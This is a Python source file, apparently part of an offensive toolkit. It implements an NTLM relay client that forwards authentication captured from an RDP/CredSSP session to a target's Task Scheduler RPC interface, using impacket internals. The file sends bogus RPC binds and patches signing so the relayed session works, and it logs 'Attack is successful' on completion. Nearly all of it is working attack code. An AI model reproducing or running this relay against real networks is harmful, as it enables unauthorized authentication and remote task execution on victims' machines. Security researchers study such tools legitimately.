from impacket.examples import logger
from impacket import version
from impacket.dcerpc.v5.rpcrt import *
from impacket.dcerpc.v5 import tsch, transport
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import atsvc,epm,rrp,lsat
from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.uuid import uuidtup_to_bin, bin_to_string
import random,string
from rdpy.core import log
import sys,thread

'''
This code does relay for RPC client.
Most of the code is taken from rpcrt.py of impacket, because we neeeded the functionality of rpc bind/alter,
but only part of it.
'''

ts = ('71710533-BEBA-4937-8319-B5DBEF9CCC36', '1.0') #transfer syntax

class DummyGSS():
    def __init__(self):
        pass
    def GSS_Unwrap(self,*params,**kw):
        #If Unwrap is reached, we know a good response was sent to a request, therefore, we succeeded.
        #We just want to end nicely here, not with exception.
        log.info("All done. Attack is successful")
        thread.interrupt_main()
        return '',''

class RelayDCE(DCERPC_v5):
    '''
    We inherit and reimplement this methods of RelayDCE.
    '''
    def __init__(self,*args,**kw):
        DCERPC_v5.__init__(self,*args,**kw)

    def sendNegotiate(self, negotiateMessage,iface_uuid, alter = 0, bogus_binds = 0, transfer_syntax = ('8a885d04-1ceb-11c9-9fe8-08002b104860', '2.0')):
        bind = MSRPCBind()
        #item['TransferSyntax']['Version'] = 1
        ctx = self._ctx
        for i in range(bogus_binds):
            item = CtxItem()
            item['ContextID'] = ctx
            item['TransItems'] = 1
            item['ContextID'] = ctx
            # We generate random UUIDs for bogus binds
            item['AbstractSyntax'] = generate() + stringver_to_bin('2.0')
            item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
            bind.addCtxItem(item)
            self._ctx += 1
            ctx += 1

        # The true one :)
        item = CtxItem()
        item['AbstractSyntax'] = iface_uuid
        item['TransferSyntax'] = uuidtup_to_bin(transfer_syntax)
        item['ContextID'] = ctx
        item['TransItems'] = 1
        bind.addCtxItem(item)

        packet = MSRPCHeader()
        packet['type'] = MSRPC_BIND
        packet['pduData'] = str(bind)
        packet['call_id'] = self._DCERPC_v5__callid

        if alter:
            packet['type'] = MSRPC_ALTERCTX

        if self._DCERPC_v5__auth_level != RPC_C_AUTHN_LEVEL_NONE:
            sec_trailer = SEC_TRAILER()
            sec_trailer['auth_type']   = self._DCERPC_v5__auth_type
            sec_trailer['auth_level']  = self._DCERPC_v5__auth_level
            sec_trailer['auth_ctx_id'] = self._ctx + 79231

            pad = (4 - (len(packet.get_packet()) % 4)) % 4
            if pad != 0:
               packet['pduData'] += '\xFF'*pad
               sec_trailer['auth_pad_len']=pad

            packet['sec_trailer'] = sec_trailer
            packet['auth_data'] = negotiateMessage

        self._transport.send(packet.get_packet())

        s = self._transport.recv()
        if s != 0:
            resp = MSRPCHeader(s)
        else:
            return 0

        if resp['type'] == MSRPC_BINDACK or resp['type'] == MSRPC_ALTERCTX_R:
            bindResp = MSRPCBindAck(str(resp))
        elif resp['type'] == MSRPC_BINDNAK or resp['type'] == MSRPC_FAULT:
            if resp['type'] == MSRPC_FAULT:
                resp = MSRPCRespHeader(str(resp))
                status_code = unpack('<L', resp['pduData'][:4])[0]
            else:
                resp = MSRPCBindNak(resp['pduData'])
                status_code = resp['RejectedReason']
            if rpc_status_codes.has_key(status_code):
                raise DCERPCException(error_code = status_code)
            elif rpc_provider_reason.has_key(status_code):
                raise DCERPCException("Bind context rejected: %s" % rpc_provider_reason[status_code])
            else:
                raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
        else:
            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])

        # check ack results for each context, except for the bogus ones
        for ctx in range(bogus_binds+1,bindResp['ctx_num']+1):
            ctxItems = bindResp.getCtxItem(ctx)
            if ctxItems['Result'] != 0:
                msg = "Bind context %d rejected: " % ctx
                msg += rpc_cont_def_result.get(ctxItems['Result'], 'Unknown DCE RPC context result code: %.4x' % ctxItems['Result'])
                msg += "; "
                reason = bindResp.getCtxItem(ctx)['Reason']
                msg += rpc_provider_reason.get(reason, 'Unknown reason code: %.4x' % reason)
                if (ctxItems['Result'], reason) == (2, 1): # provider_rejection, abstract syntax not supported
                    msg += " (this usually means the interface isn't listening on the given endpoint)"
                raise DCERPCException(msg)

            # Save the transfer syntax for later use
            self.transfer_syntax = ctxItems['TransferSyntax']

        # The received transmit size becomes the client's receive size, and the received receive size becomes the client's transmit size.
        self._DCERPC_v5__max_xmit_size = bindResp['max_rfrag']
        return bindResp['auth_data'] ,bind

    def sendAuth(self, authenticateMessageBlob, bind=None):
        self._DCERPC_v5__sequence = 0
        response=authenticateMessageBlob #from here not really needed.
        self._DCERPC_v5__sessionKey = "".join([random.choice(string.digits+string.letters) for _ in xrange(16)])
        #Not really important, but wanted things to be
        if self._DCERPC_v5__auth_level in (RPC_C_AUTHN_LEVEL_CONNECT, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY):
            if self._DCERPC_v5__auth_type == RPC_C_AUTHN_WINNT:
                if self._DCERPC_v5__flags & ntlm.NTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY:
                    self._DCERPC_v5__clientSigningKey = ntlm.SIGNKEY(self._DCERPC_v5__flags, self._DCERPC_v5__sessionKey)
                    self._DCERPC_v5__serverSigningKey = ntlm.SIGNKEY(self._DCERPC_v5__flags, self._DCERPC_v5__sessionKey,"Server")
                    self._DCERPC_v5__clientSealingKey = ntlm.SEALKEY(self._DCERPC_v5__flags, self._DCERPC_v5__sessionKey)
                    self._DCERPC_v5__serverSealingKey = ntlm.SEALKEY(self._DCERPC_v5__flags, self._DCERPC_v5__sessionKey,"Server")
                    # Preparing the keys handle states
                    cipher3 = ARC4.new(self._DCERPC_v5__clientSealingKey)
                    self._DCERPC_v5__clientSealingHandle = cipher3.encrypt
                    cipher4 = ARC4.new(self._DCERPC_v5__serverSealingKey)
                    self._DCERPC_v5__serverSealingHandle = cipher4.encrypt
                else:
                    # Same key for everything
                    self._DCERPC_v5__clientSigningKey = self._DCERPC_v5__sessionKey
                    self._DCERPC_v5__serverSigningKey = self._DCERPC_v5__sessionKey
                    self._DCERPC_v5__clientSealingKey = self._DCERPC_v5__sessionKey
                    self._DCERPC_v5__serverSealingKey = self._DCERPC_v5__sessionKey
                    cipher = ARC4.new(self._DCERPC_v5__clientSigningKey)
                    self._DCERPC_v5__clientSealingHandle = cipher.encrypt
                    self._DCERPC_v5__serverSealingHandle = cipher.encrypt
            elif self._DCERPC_v5__auth_type == RPC_C_AUTHN_NETLOGON:
                if self._DCERPC_v5__auth_level == RPC_C_AUTHN_LEVEL_PKT_INTEGRITY:
                    self._DCERPC_v5__confounder = ''
                else:
                    self._DCERPC_v5__confounder = '12345678'

        sec_trailer = SEC_TRAILER()
        sec_trailer['auth_type'] = self._DCERPC_v5__auth_type
        sec_trailer['auth_level'] = self._DCERPC_v5__auth_level
        sec_trailer['auth_ctx_id'] = self._ctx + 79231

        if response is not None:
            if self._DCERPC_v5__auth_type == RPC_C_AUTHN_GSS_NEGOTIATE:
                alter_ctx = MSRPCHeader()
                alter_ctx['type'] = MSRPC_ALTERCTX
                alter_ctx['pduData'] = str(bind)

                alter_ctx['sec_trailer'] = sec_trailer
                alter_ctx['auth_data'] = str(response)
                alter_ctx['call_id'] = self._DCERPC_v5__callid
                self._transport.send(alter_ctx.get_packet(), forceWriteAndx = 1)
                self._DCERPC_v5__gss = DummyGSS() #Our gss
            else:
                auth3 = MSRPCHeader()
                auth3['type'] = MSRPC_AUTH3
                # pad (4 bytes): Can be set to any arbitrary value when set and MUST be
                # ignored on receipt. The pad field MUST be immediately followed by a
                # sec_trailer structure whose layout, location, and alignment are as
                # specified in section 2.2.2.11
                auth3['pduData'] = '    '
                auth3['sec_trailer'] = sec_trailer
                auth3['auth_data'] = str(response)

                # Use the same call_id
                auth3['call_id'] = self._DCERPC_v5__callid
                self._transport.send(auth3.get_packet(), forceWriteAndx = 1)
        self._DCERPC_v5__callid += 1
        s = self._transport.recv()
        if s != 0:
            resp = MSRPCHeader(s)
        else:
            return 0 #mmm why not None?

        if resp['type'] == MSRPC_BINDACK or resp['type'] == MSRPC_ALTERCTX_R:
            bindResp = MSRPCBindAck(str(resp))
        elif resp['type'] == MSRPC_BINDNAK or resp['type'] == MSRPC_FAULT:
            if resp['type'] == MSRPC_FAULT:
                resp = MSRPCRespHeader(str(resp))
                status_code = unpack('<L', resp['pduData'][:4])[0]
            else:
                resp = MSRPCBindNak(resp['pduData'])
                status_code = resp['RejectedReason']
            if rpc_status_codes.has_key(status_code):
                raise DCERPCException(error_code = status_code)
            elif rpc_provider_reason.has_key(status_code):
                raise DCERPCException("Bind context rejected: %s" % rpc_provider_reason[status_code])
            else:
                raise DCERPCException('Unknown DCE RPC fault status code: %.8x' % status_code)
        else:
            raise DCERPCException('Unknown DCE RPC packet type received: %d' % resp['type'])

        self._DCERPC_v5__max_xmit_size = bindResp['max_rfrag']

        return bindResp['auth_data']


    def sendRegister(self,pubkeyauth):
        req= str(pubkeyauth)
        log.debug( 'request len ' + str(len(req)-16-44))
        self.signature=req[:60]

        resp = self.call(1, req[60:], None) #1 is opnum
        log.debug(str(resp))
        answer = self.recv() #it will be ''
    def _transport_send(self, rpc_packet, forceWriteAndx = 0, forceRecv = 0):
        #calls self.signature
        rpc_packet['ctx_id'] = self._ctx
        rpc_packet['sec_trailer'] = ''
        rpc_packet['auth_data'] = ''

        if self._DCERPC_v5__auth_level in [RPC_C_AUTHN_LEVEL_PKT_INTEGRITY, RPC_C_AUTHN_LEVEL_PKT_PRIVACY]:
            # Dummy verifier, just for the calculations
            sec_trailer = SEC_TRAILER()
            sec_trailer['auth_type'] = self._DCERPC_v5__auth_type
            sec_trailer['auth_level'] = self._DCERPC_v5__auth_level
            sec_trailer['auth_pad_len'] = 0
            sec_trailer['auth_ctx_id'] = self._ctx + 79231

            pad = (4 - (len(rpc_packet.get_packet()) % 4)) % 4
            if pad != 0:
                rpc_packet['pduData'] += '\x00'*pad
                sec_trailer['auth_pad_len']=pad

            rpc_packet['sec_trailer'] = str(sec_trailer)
            rpc_packet['auth_data'] = ' '*16

            plain_data = rpc_packet['pduData']

            rpc_packet['sec_trailer'] = str(sec_trailer)
            rpc_packet['auth_data'] = str(self.signature)

            self._DCERPC_v5__sequence += 1

        self._transport.send(rpc_packet.get_packet(), forceWriteAndx = forceWriteAndx, forceRecv = forceRecv)

class RPCRelayClient:
    '''
    Main class for relay to client
    '''
    def __init__(self, target, port=None):
        self.target = target
        self.negotiateMessage = None
        self.authenticateMessageBlob = None
        self.connection = None
        self.server = None

    def init_connection(self):
        stringbinding = r'ncacn_ip_tcp:%s' % self.target
        stringbinding = epm.hept_map(self.target, tsch.MSRPC_UUID_TSCHS, protocol = 'ncacn_ip_tcp')
        rpctransport = transport.DCERPCTransportFactory(stringbinding)
        dce = RelayDCE(rpctransport)
        dce.set_auth_type(RPC_C_AUTHN_GSS_NEGOTIATE)

        if hasattr(rpctransport, 'set_credentials'):
            rpctransport.set_kerberos(0)

        dce.set_credentials(*rpctransport.get_credentials())
        dce._DCERPC_v5__auth_level=RPC_C_AUTHN_LEVEL_PKT_PRIVACY
        dce.connect()
        self.dce=dce

    def sendNegotiate(self, negotiateMessage):
        return self.dce.sendNegotiate(negotiateMessage,tsch.MSRPC_UUID_TSCHS, transfer_syntax = ts)

    def sendAuth(self, authenticateMessageBlob, bind=None):
        return self.dce.sendAuth(authenticateMessageBlob,bind=bind)

    def sendCmd(self,pubkeyauth):
        return self.dce.sendRegister(pubkeyauth)
